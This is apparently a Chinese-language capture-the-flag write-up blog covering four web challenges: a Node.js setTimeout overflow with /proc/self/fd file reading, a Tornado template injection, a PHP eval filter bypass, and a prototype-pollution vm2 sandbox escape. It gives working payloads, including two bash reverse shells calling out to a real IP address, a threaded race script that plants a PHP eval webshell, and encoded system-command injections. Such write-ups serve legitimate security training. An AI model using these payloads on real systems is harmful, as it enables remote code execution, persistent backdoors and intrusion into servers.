src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223113609841.png" alt="image-20241223113609841"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223113620325.png" alt="image-20241223113620325"></p><p>拿捏了！</p><h2 id="prize-p2"><a href="#prize-p2" class="headerlink" title="prize_p2"></a>prize_p2</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; randomBytes &#125; = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fp = <span class="string">&#x27;/app/src/flag.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> flag = <span class="title class_">Buffer</span>(<span class="number">255</span>);</span><br><span class="line"><span class="keyword">const</span> a = fs.<span class="title function_">open</span>(fp, <span class="string">&#x27;r&#x27;</span>, <span class="function">(<span class="params">err, fd</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.<span class="title function_">read</span>(fd, flag, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        fs.<span class="title function_">rm</span>(fp, <span class="function">() =&gt;</span> &#123;&#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(__filename));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/hint&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(flag.<span class="title function_">toString</span>().<span class="title function_">slice</span>(<span class="number">0</span>, <span class="title function_">randomBytes</span>(<span class="number">1</span>)[<span class="number">0</span>]%<span class="number">32</span>));</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 随机数预测或者一天之后</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/getflag&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">        <span class="keyword">if</span> (a === <span class="title function_">randomBytes</span>(<span class="number">3</span>).<span class="title function_">toString</span>()) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(req.<span class="property">query</span>.<span class="property">b</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> t = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(req.<span class="property">query</span>.<span class="property">b</span>));</span><br><span class="line">            &#125;, <span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">c</span>)?<span class="title class_">Math</span>.<span class="title function_">max</span>(<span class="number">86400</span>*<span class="number">1000</span>, <span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">c</span>)):<span class="number">86400</span>*<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>关键点在&#x2F;getflag，它可以发送请求。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fp = <span class="string">&#x27;/app/src/flag.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> flag = <span class="title class_">Buffer</span>(<span class="number">255</span>);</span><br><span class="line"><span class="keyword">const</span> a = fs.<span class="title function_">open</span>(fp, <span class="string">&#x27;r&#x27;</span>, <span class="function">(<span class="params">err, fd</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.<span class="title function_">read</span>(fd, flag, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        fs.<span class="title function_">rm</span>(fp, <span class="function">() =&gt;</span> &#123;&#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>同时，我们注意看这里</p><p>&#x2F;app&#x2F;src&#x2F;flag.txt 文件被 open() 打开，但最终没有关闭，虽然删除了该文件，但在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。&#x2F;proc&#x2F;self&#x2F;fd 这个目录里包含了进程打开文件的情况，目录里面有一堆&#x2F;proc&#x2F;self&#x2F;fd&#x2F;id文件，id就是进程记录的打开文件的文件描述符的序号。id可爆破猜测获得。</p><p>setTimeout是使用Int32来存储延时参数值的，也就是说最大的延时值是2^31-1。 一旦超过了最大值，其效果就跟延时值为0的情况一样。数为 2147483648，即可实现延时为0。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223130449675.png" alt="image-20241223130449675"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223130528458.png" alt="image-20241223130528458"></p><h2 id="NSSCTF-2nd-MyHurricane"><a href="#NSSCTF-2nd-MyHurricane" class="headerlink" title="[NSSCTF 2nd]MyHurricane"></a>[NSSCTF 2nd]MyHurricane</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">BASE_DIR = os.path.dirname(__file__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line">    bl = [<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> bl:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> data.split():</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chunk:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">31</span> &lt; <span class="built_in">ord</span>(c) &lt; <span class="number">128</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IndexHandler</span>(tornado.web.RequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="variable language_">self</span>.finish(f.read())</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self</span>):</span><br><span class="line">        data = <span class="variable language_">self</span>.get_argument(<span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(data):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                        </span></span><br><span class="line"><span class="string">                        <span class="subst">&#123;data&#125;</span></span></span><br><span class="line"><span class="string">                        &quot;&quot;&quot;</span>)</span><br><span class="line">                f.flush()</span><br><span class="line">            <span class="variable language_">self</span>.render(<span class="string">&#x27;1.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.finish(<span class="string">&#x27;no no no&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = tornado.web.Application([</span><br><span class="line">            (<span class="string">r&quot;/&quot;</span>, IndexHandler),</span><br><span class="line">        ], compiled_template_cache=<span class="literal">False</span>)</span><br><span class="line">    app.listen(<span class="number">827</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure><p>不影响读文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssti=&#123;% extends /etc/passwd %&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223165932556.png" alt="image-20241223165932556"></p><p>这里应该直接非预期了！</p><p>正常来做，过滤了括号引号啥的，笔记了解一下</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223170940953.png" alt="image-20241223170940953"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssti=&#123;%set _tt_utf8=eval%&#125;&#123;%raw request.body_arguments[request.method][0]%&#125;&amp;POST=__import__(&#x27;os&#x27;).popen(&quot;bash -c &#x27;bash -i &gt;%26 /dev/tcp/156.238.233.113/4567 &lt;%261&#x27;&quot;)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223171201655.png" alt="image-20241223171201655"></p><p>额，虽然最后也是在环境变量里找到flag的。。。</p><h2 id="第五空间-2021-EasyCleanup"><a href="#第五空间-2021-EasyCleanup" class="headerlink" title="[第五空间 2021]EasyCleanup"></a>[第五空间 2021]EasyCleanup</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__); </span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123; </span><br><span class="line">    <span class="variable">$shell</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>] : <span class="string">&#x27;phpinfo();&#x27;</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$shell</span>) | <span class="title function_ invoke__">checkNums</span>(<span class="variable">$shell</span>)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> True; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>; </span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123; </span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>; </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">8</span>) <span class="keyword">return</span> True; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>方法看上去是有两种的，一种是想办法rce，一种是include来进行文件包含</p><p>方法一RCE：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?mode=eval&amp;shell=system(~%93%8C%DF%D0);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223172100977.png" alt="image-20241223172100977"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl /*</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?mode=eval&amp;shell=system(~%91%93%DF%D0%D5);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223172424946.png" alt="image-20241223172424946"></p><p>方法二：session条件竞争</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28547/&#x27;</span></span><br><span class="line">sessionid = <span class="string">&#x27;met&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>): <span class="comment"># 写入临时文件</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>) <span class="comment"># 50kb</span></span><br><span class="line">        session.post(url, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessionid&#125;, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php file_put_contents(&#x27;/var/www/html/shell.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);?&gt;&quot;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.jpg&#x27;</span>, fileBytes)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        session.get(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid) <span class="comment"># 进行文件包含</span></span><br><span class="line">        r = session.get(url+<span class="string">&#x27;shell.php&#x27;</span>) <span class="comment"># 检查是否写入一句话木马</span></span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line">evnet = threading.Event() <span class="comment"># 多线程</span></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    threading.Thread(target=read, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">evnet.<span class="built_in">set</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不知道为啥，没成功？！可能是环境问题吧我觉得。。。</p><h2 id="HZNUCTF-2023-final-eznode"><a href="#HZNUCTF-2023-final-eznode" class="headerlink" title="[HZNUCTF 2023 final]eznode"></a>[HZNUCTF 2023 final]eznode</h2><p>打开让我们找源码，扫个目录看看</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">VM</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> backdoor = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(&#123;&#125;.<span class="property">shellcode</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;POST some json shit to /.  no source code and try to find source code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">        <span class="keyword">var</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>));</span><br><span class="line">        <span class="keyword">var</span> copybody = <span class="title function_">clone</span>(body)</span><br><span class="line">        <span class="keyword">if</span> (copybody.<span class="property">shit</span>) &#123;</span><br><span class="line">            <span class="title function_">backdoor</span>()</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;post shit ok&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;is it shit ?&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>有个vm2啊，可能跟vm2的沙箱逃逸有关！</p><p>发现一个merge函数，原型链污染的常客，大概就是在页面post传递一个json数据，会经过json.parse函数解析，然后再通过clone()函数复制到copybody变量中，最后判断该变量的shit值是否为真，然后调用backdoor()函数在VM2沙箱中执行{}.shellcode属性。</p><p>backdoor函数利用vm2执行shellcode，这个shellcode其他地方没有得传值，所以我们利用原型链污染传递shellcode，污染成VM2沙箱逃逸的payload即可执行任意命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;shit&quot;:&quot;1&quot;,&quot;__proto__&quot;:&#123;&quot;shellcode&quot;:&quot;let res = import(&#x27;./app.js&#x27;); res.toString.constructor(&#x27;return this&#x27;)().process.mainModule.require(&#x27;child_process&#x27;).execSync(\&quot;bash -c &#x27;bash -i &gt;&amp;/dev/tcp/156.238.233.113/4567 0&gt;&amp;1&#x27;\&quot;).toString();&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><img 